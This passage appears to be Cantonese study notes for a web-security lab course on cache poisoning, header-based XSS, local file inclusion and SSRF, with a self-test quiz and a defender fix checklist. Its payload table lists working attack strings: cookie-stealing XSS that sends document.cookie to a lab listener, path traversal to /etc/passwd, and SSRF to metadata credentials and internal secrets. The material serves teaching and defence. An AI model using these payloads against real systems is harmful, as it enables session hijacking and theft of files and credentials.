| §5 | `X-Forwarded-Host` header | 當係可信 hostname 砌絕對 URL | cache key 漏咗佢；無 header 剝離 |
| §7 | `X-Username` header | 直接 echo 入 HTML | 無 output encoding |
| §10 | `?lang=` 參數 | 直接拼入 `include` 路徑 | 無 allow-list／`basename()`／`realpath()` |
| §14 | `preview_url`／`url` 參數 | 直接交去 `file_get_contents()` | 無 scheme／host／port allow-list |

**一句記法**：四個漏洞都係「**用戶嘅字，被當成系統嘅意思**」——照妖鏡就係自問「呢個輸入係邊度嚟？程式有冇當佢係人打嘅嘢去驗證？」

### 8.2 Payload 對照表（一字不改）

| 情境 | Payload／值 | 用途 |
|---|---|---|
| §5 canary | `X-Forwarded-Host: hkiitcanary1234` | 確認 unkeyed input |
| §5 毒 host | `X-Forwarded-Host: evil.example.com` | 污染 cache |
| §7 反射確認 | `X-Username: CANARY_TEST_123` | 確認 header 反射 |
| §7 script | `X-Username: <script>document.body.style.border='12px solid red'</script>` | 證明 JS 執行 |
| §7 img onerror | `X-Username: <img src=x onerror="this.outerHTML='<mark>XSS via img onerror</mark>'">` | 繞過 script filter |
| §7 svg onload | `X-Username: <svg onload="this.outerHTML='<mark>XSS via svg onload</mark>'"></svg>` | 元素 load handler |
| §7 偷 cookie | `X-Username: <img src=x onerror="this.outerHTML='<mark>Stolen cookie: '+document.cookie+'</mark>'">` | 讀 `document.cookie` |
| §7 外傳 | `X-Username: <img src=x onerror="fetch('http://192.168.56.1:8088/?c='+encodeURIComponent(document.cookie))">` | 送去 netcat listener |
| §7 lab leak | `X-Username: <img src=x onerror="fetch('/oauth.php?action=leak&c='+encodeURIComponent(document.cookie)).then(()=>this.outerHTML='<mark>Cookie exfiltrated to attacker server</mark>')">` | lab 內部 collector |
| §10 traversal | `http://localhost:8080/index.php?lang=../../../../../../etc/passwd` | 讀系統檔 |
| §10 讀 backup | `http://localhost:8080/index.php?lang=../backup/config.php.bak` | 讀應用 source |
| §14 metadata | `http://localhost:8080/metadata.php?path=latest/meta-data/iam/security-credentials/LabInstanceRole` | 假 AWS 憑證 |
| §14 內部 secrets | `http://localhost:8080/internal/api.php?endpoint=secrets` | SMTP／API／VPN／DB secrets |
| §14 內部 users | `http://localhost:8080/internal/api.php?endpoint=users` | service accounts |
| §14 讀本地檔 | `curl "http://localhost:8080/imgproxy.php?url=file:///etc/passwd"` | image proxy 變讀檔器 |

### 8.3 英文必背句

- *Web cache poisoning tricks the cache into storing a harmful response and serving it to other users who request the same URL.*
- *An unkeyed input is a request input that changes the response but is not part of the cache key.*
- *Reflected header XSS occurs when markup smuggled in an HTTP header is echoed into the page without encoding, so the victim's browser executes it with the site's privileges.*
- *Local File Inclusion occurs when an application loads a file based on user-supplied input without proper validation.*
- *Because the request originates from the server, it inherits the server's network position and level of trust.*
- *In PHP, `include()` executes any PHP code inside the loaded file.*

### 8.4 5 條自測問題

1. §5：點樣用一個 private window 分辨「真係污染咗 cache」同「只係自己 browser cache」？
2. §7：為何 header-based 反射 XSS 唔會被「前端表單驗證」擋到？
3. §10：安全寫法用邊三個措施阻止 `../` 逃逸？各自作用係乜？
4. §14：`@file_get_contents()` 個 `@` 究竟做咩？佢係咪防護？
5. §14：點解 image proxy 可以變成任意檔案讀取器？

**答案（最後一行）**：1. 開全新 private window（冇帶 header）去同一 URL，若仍見毒連結 = cache 真污染；若清 browser cache 後就冇 → 之前只係本地 cache。 2. 因為前端驗證係檢查表單欄位、喺瀏覽器度行；攻擊者用 Burp 直接喺 header 落 payload，條 request 跳過整段網站 JS。 3. ①allow-list map（只有 `en`／`zh`／`zht` 三個固定路徑可被載入）；②`basename()`（剝走輸入嘅目錄成份）；③`realpath()` 加 `strpos($path, realpath('lang')) !== 0` 檢查（確認解析後檔案仍在 `lang/` 內）。 4. `@` 只係抑制 PHP warning；佢唔會阻擋任何嘢，唔係防護。 5. 因為 image proxy 用 `file://` wrapper 時，`file_get_contents()` 會改為讀取伺服器本地檔，再連 image content type pass through 回傳，所以可讀任意檔。

---

## 🛡️ 9. 防守方修正清單（Defender Fix Checklist）

### 9.1 §5 Cache Poisoning

- **原文修法**：實行 cache-key discipline——把所有影響 response 嘅輸入都納入 cache key，或者喺 cache 層剝走唔受信任嘅 header（令佢哋改唔到存起嘅頁面）；只 cache 真正靜態內容；**永遠唔好用客戶端可控 header（例如 `X-Forwarded-Host`）去砌連結、redirect 或 script URL**（改由前端 proxy 設定同 sanitize）；推出修復後 purge 已污染嘅 entry。
- > ⚠️ 教材外補充：具體做法——reverse proxy（nginx／HAProxy／CDN）上，明確設定哪些 header 入 cache key（多數時候 host 用 `Host`，唔好用 `X-Forwarded-Host` 作為建立 response 嘅依據）；喺應用層（PHP）由伺服器配置或 allow-list 決定 base URL，唔好讀 `$_SERVER['HTTP_X_FORWARDED_HOST']`；加 `Vary` 只係針對你**預期**會變嘅 header，唔好攬埋攻擊者可控嘅 header；上線後對 cache 做 purge/invalidate。

### 9.2 §7 Reflected XSS

- **原文修法**：**永遠唔好把 request data（包括 header）無 context-aware output encoding 就 echo 入頁面**；設 restrictive 嘅 **Content Security Policy (CSP)** 令注入嘅 script 執行唔到；把 session cookie 標記 **`HttpOnly`** 令 `document.cookie` 讀唔到；優先採用**預設自動轉義**嘅框架。
- > ⚠️ 教材外補充：PHP 具體做法——用 `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` 做 HTML context 輸出；屬性／JS／URL context 用對應編碼（例如 `json_encode`、`rawurlencode`）；cookie 全部設 `HttpOnly; Secure; SameSite=Strict`；CSP 用 `default-src 'self'` 並避免 `unsafe-inline`；ASP.NET 做法——Razor 預設自動 HTML-encode（`@Model.Value`），需手動 `@Html.Raw` 才會不轉義，另可用 `Antiforgery`、`Cookie.SecurePolicy`、以及 response header `Content-Security-Policy`。企業層面：輸入 header 唔好當成顯示名（`X-Username` 呢類根本唔應該信任）。

### 9.3 §10 LFI via Language Loader

- **原文修法**：**永遠唔好把用戶輸入拼入檔案路徑**。用 allow-list 限制可載入嘅檔案；用 `basename()` 剝走目錄成份；用 `realpath()` 確認解析後路徑仍然喺預定目錄內；把語言檔當成**資料讀取**（例如用 `json_decode(file_get_contents(...))`）而唔係用 `include` 執行。
- > ⚠️ 教材外補充：PHP 具體做法——`$allowed = ['en' => 'lang/en', ...]; if (!isset($allowed[$lang])) $lang = 'en';` 再 `realpath` 檢查；或用 `in_array($lang, ['en','zh','zht'], true)`。把語言檔改成 `.json`／`.php` 但只 `return` 資料、唔執行邏輯；關閉唔需要嘅 URL wrapper（`allow_url_include=Off`、`allow_url_fopen=Off`）；上傳目錄同 log 目錄**唔可被 PHP 執行**（web server 設定禁止該目錄執行 script），切斷 LFI→RCE 鏈；ASP.NET 做法——用 `Path.GetFullPath` 後檢查 `StartsWith(baseDir)`、唔好把用戶輸入直接拼 `Server.MapPath`。

### 9.4 §14 SSRF

- **原文修法**：**allow-list 目的地同 URL scheme**；封鎖私有同 link-local 範圍（包括 `169.254.169.254`，以及解析到呢啲位址嘅 redirect）；停用 `file://` wrapper；把 outbound fetch 經**隔離網段嘅硬淨 proxy**，令雲 metadata 端點不可達。
- > ⚠️ 教材外補充：具體做法——只准 `https://` 且域名喺 allow-list；解析 hostname 後**驗證解析出嘅 IP** 唔屬私有／link-local／loopback，並**固定（pin）該 IP** 去做實際 fetch，以防 DNS rebinding；**唔好盲目跟 redirect**（或每次都重新驗證 redirect 目標）；對 outbound 設 timeout 同 response size 上限；用獨立 egress proxy 段，配 metadata 服務嘅 network policy（例如雲平台 IMDSv2 要求 token）；PHP 做法——避免直接用 `file_get_contents($userUrl)`，改用 cURL 並設 `CURLOPT_PROTOCOLS`／`CURLOPT_REDIR_PROTOCOLS` 限 `https`、`CURLOPT_FOLLOWLOCATION=false`；ASP.NET 做法——用 `HttpClient` + `SocketsHttpHandler` 加 allow-list handler、`AllowAutoRedirect=false`。企業層面：內部服務**唔好靠網絡位置當認證**，加服務間認證。

➜ 對應速記：`ART_Final_CheatSheet.md`
